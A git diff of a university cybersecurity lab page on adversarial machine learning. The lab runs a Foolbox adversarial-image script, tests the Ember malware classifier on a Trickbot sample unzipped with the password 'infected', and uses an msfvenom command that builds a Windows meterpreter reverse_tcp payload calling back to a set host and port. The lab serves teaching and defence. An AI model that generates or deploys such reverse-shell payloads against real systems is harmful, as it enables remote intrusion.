@@ -22,11 +22,8 @@ Adversarial attacks could become increasingly common as we come to rely on machi
 
 In the area of malware recognition, malware can adopt tactics to prevent recognition by taking an adversarial approach.
 
-To see how this works, we can use a program that uses what is called a non-targeted black box approach to adversarial images.
+To see how this works, we can use a program that uses what is called a non-targeted black box approach to adversarial images. To set it up, follow the instructions below.
 
-Two methods you can do this lab - using pre-built image or using public TensorFlow image (only one method is needed):
-
-#### Method 1. Using pre-built image:
 
 {% tabs %}
 {% tab title="Windows/Linux" %}
@@ -36,11 +33,8 @@ sudo docker run -it --rm uwacyber/cits1003-labs:ai-image
 {% endtab %}
 
 {% tab title="Apple Silicon" %}
-```
-# I have tried building an image as below:
+```bash
 docker run -it --rm uwacyber/cits1003-labs:ai-image-arm 
-
-# but if it doesn't work, try the below method.
 ```
 {% endtab %}
 {% endtabs %}
@@ -51,36 +45,11 @@ Also install `matplotlib` inside the container to run the code later:
 pip3 install matplotlib
 ```
 
-#### Method 2. Using public TensorFlow image (require further installations):
-
-{% tabs %}
-{% tab title="Windows/Linux" %}
-```bash
-sudo docker run -it --rm tensorflow/tensorflow bash
-```
-{% endtab %}
-
-{% tab title="Apple Silicon" %}
-```
-sudo docker run -it --rm armswdev/tensorflow-arm-neoverse-n1 bash
-```
-{% endtab %}
-{% endtabs %}
-
-Next, `cd` in to `/opt` directory and download lab files (execute line by line):
-
-```
-apt-get install wget
-wget https://github.com/uwacyber/cits1003/raw/2022s1/cits1003-labs/files/lab_og.jpg
-wget https://github.com/uwacyber/cits1003/raw/2022s1/cits1003-labs/files/exploit.py
-pip3 install matplotlib
-```
-
-Once on the docker container, go to the directory `/opt`. From there, run the `exploit.py` program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes from a toolkit called _Foolbox_ ([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)).
+Once on the docker container, go to the directory `/opt` if not already. From there, run the `exploit.py` program. This program will take a normal image of a Labrador and create adversarial versions of the image. If you are interested in the details, the program comes from a toolkit called _Foolbox_ ([https://github.com/bethgelab/foolbox](https://github.com/bethgelab/foolbox)).
 
 To run the script we do so as follows:
 
-```
+```bash
 python3 exploit.py lab_og.jpg
 ```
 
@@ -160,7 +129,7 @@ To do this, Ember uses a framework called LIEF that will analyse Windows (and ot
 
 Let's start the docker container to run Ember:
 
-```
+```bash
 sudo docker run -it --rm uwacyber/cits1003-labs:ai-malware
 ```
 
@@ -168,13 +137,13 @@ To test the model `cd` on the same docker container to the directory `/opt/ember
 
 First, unzip the malware (with the usual password: `infected`):
 
-```
+```bash
 unzip malware.zip
 ```
 
 To test the malware, we can use the following command:
 
-```
+```bash
 python3 scripts/classify_binaries.py -m ember_model_2018.txt malware
 ```
 
@@ -195,7 +164,7 @@ The malware is actually _Trickbot_, which is a banking trojan.
 
 We can now try with a normal Windows program `git.exe`
 
-```
+```bash
 python3 scripts/classify_binaries.py -m ember_model_2018.txt git.exe
 ```
 
@@ -228,7 +197,7 @@ In other words, a practically 0 score for it being malware.
 
 To get started, we are going to run Metasploit. But firstly, we will create a local volume that we can attach to different containers - this is due to the files we are about to create will most likely be filtered automatically by your firewall. So let's create a temporary volume. In your PowerShell/terminal:
 
-```
+```bash
 sudo docker volume create volume1
 ```
 
@@ -236,7 +205,7 @@ This will create a local volume named `volume1`, you can check by `docker volume
 
 Let's run a Docker container as follows:
 
-```
+```bash
 sudo docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:metasploit
 ```
 
@@ -338,7 +307,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.34 LPORT=4443 \
 
 Now that we have the three different samples, we can go back to our classifier in the `ai-malware` container and see what happens. Launch the `ai-malware` container with the `volume1` attached (it will be a new container instance of the `ai-malware` image):
 
-```
+```bash
 sudo docker run -v volume1:/volume1 -it --rm uwacyber/cits1003-labs:ai-malware
 ```
 
